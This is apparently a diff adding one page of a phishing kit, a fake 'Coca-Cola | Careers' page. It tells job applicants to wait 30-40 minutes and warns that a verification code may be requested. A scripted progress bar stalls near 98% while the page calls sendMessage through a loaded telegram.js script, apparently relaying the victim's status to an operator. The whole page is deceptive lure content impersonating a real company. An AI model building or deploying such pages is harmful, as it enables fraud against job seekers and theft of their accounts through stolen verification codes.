@@ -1,0 +1,97 @@
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000001">
+    <meta name="description" content="">
+    <title>Coca-Cola | Careers</title>
+    <link href="./assets/style.css" rel="stylesheet">
+    <link href="./assets/loader.css" rel="stylesheet">
+    <script src="./js/telegram.js"></script>
+    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
+  </head>
+  <body>
+    <noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root">
+      <div class="bg-white">
+        <div class="loading-component h-screen bg-white flex">
+          <main class="container m-auto max-w-[584px] px-[12px] bg-white rounded-md">
+            <div class="flex flex-col w-full justify-center">
+                
+              <div class="flex justify-center my-6 border-0">
+                <div>
+                  <div class="relative z-10" id="headlessui-dialog-13" role="dialog" aria-modal="true">
+                      
+                    <div class="fixed inset-0 bg-gray-300 bg-opacity-100"></div>
+                  
+                    <div class="fixed inset-0 overflow-y-auto">
+                    
+                      <div class="flex min-h-full items-center justify-center p-4 text-center">
+
+                        <div id="headlessui-dialog-panel-16" class="w-full max-w-xl transform overflow-hidden rounded-lg bg-white border border-gray-200 p-4 text-left align-middle shadow-xl transition-all">
+                            
+                          <div class="flex flex-col sm:flex-row justify-between">
+                              <div style="display: flex; justify-content: center; align-items: center; height: 100%; width: 100%;">
+  <img src="./assets/cc.gif" alt="Coca-Cola GIF" style="width: 300px; height: 300px; border-radius: 200px; margin-bottom: 15px;">
+</div>
+  <p></p>
+   <p></p>
+</div>
+
+
+                            <div class="text-sm text-gray-600 sm:pl-2">
+                              <p class="">
+                                <span class="font-semibold">Dear applicant</span>, please be patient as we gather and analyze your information. This process may take 30-40 minutes, and we may request additional details like cv, meeting time or verification code if needed.
+                              </p>
+                              <p class="text-red-400 mt-4">Do not close this window or navigate outside of this page!</p>
+                              <div class="w-full bg-gray-200 rounded-full mt-4">
+                                <div id="loading-bar-container" style="width: 100%; background-color: #e0e0e0; border-radius: 25px; height: 20px; position: relative;">
+                                  <div id="loading-bar" class="bg-blue-600 text-xs font-medium text-blue-100 text-center p-0.5 leading-none rounded-full" style="width: 2%; height: 100%; transition: width 1s linear;"></div>
+                                </div>
+                              </div>
+                              <span id="error-message" style="color: red; display: none;"></span>
+                              <input id="message" style="display:none;" value="LOADING" type="text">
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div></div>
+            </div>
+          </main>
+        </div>
+      </div>
+    </div>
+  </body>
+  <script>
+      
+      setTimeout(function() {sendMessage('LOADING')}, 1000);
+
+      function animateLoadingBar() {
+        const loadingBar = document.getElementById('loading-bar');
+        let currentWidth = 2; // Start width in percentage
+        const maxWidth = 98; // Maximum width to stop at (just under 100%)
+        const totalDuration = 30 * 60 * 1000; // Total time in milliseconds (30 minutes)
+        const interval = 1000; // Update interval in milliseconds (1 second)
+        const increment = (maxWidth - currentWidth) / (totalDuration / interval); // Calculate the increment per second
+
+        const intervalId = setInterval(() => {
+          currentWidth += increment;
+
+          if (currentWidth >= maxWidth) {
+            currentWidth = maxWidth; // Stop incrementing at maxWidth
+            clearInterval(intervalId); // Stop the animation
+          }
+
+          loadingBar.style.width = `${currentWidth}%`;
+          loadingBar.textContent = `${Math.floor(currentWidth)}%`;
+        }, interval);
+      }
+
+      // Start the loading animation
+      animateLoadingBar();
+  </script>
+</html>
